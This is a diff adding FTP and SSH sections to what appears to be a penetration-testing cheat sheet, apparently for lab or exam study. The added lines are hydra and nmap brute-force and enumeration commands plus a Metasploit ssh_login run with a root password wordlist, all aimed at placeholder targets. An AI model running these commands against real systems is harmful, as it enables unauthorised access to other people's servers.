@@ -114,6 +114,30 @@ set RHOSTS IPADDRESS
 exploit
 ```
 
+## FTP Basic 
+
+```
+hydra -L username_list -P password_list IPADDRESS -t 4 ftp
+nmap --script ftp-brute --script-args userdb=username_list -p 21 IPADDRESS
+nmap --script ftp-anon IP
+```
+## SSH 
+```
+nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=username" IPADDRESS
+hydra -l student_file -P password_list IPADDRESS ssh
+nmap -p 22 --script ssh-brute --script-args userdb=user_file IPADDRESS
+```
+## SSH MSF Console 
+```
+msfconsole
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS IPADDRESS
+set USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt
+set STOP_ON_SUCCESS true
+set verbose true
+exploit
+```
+
 ## MySQL 
 ```
 mysql -h IPADDRESS -u root //connect to user account
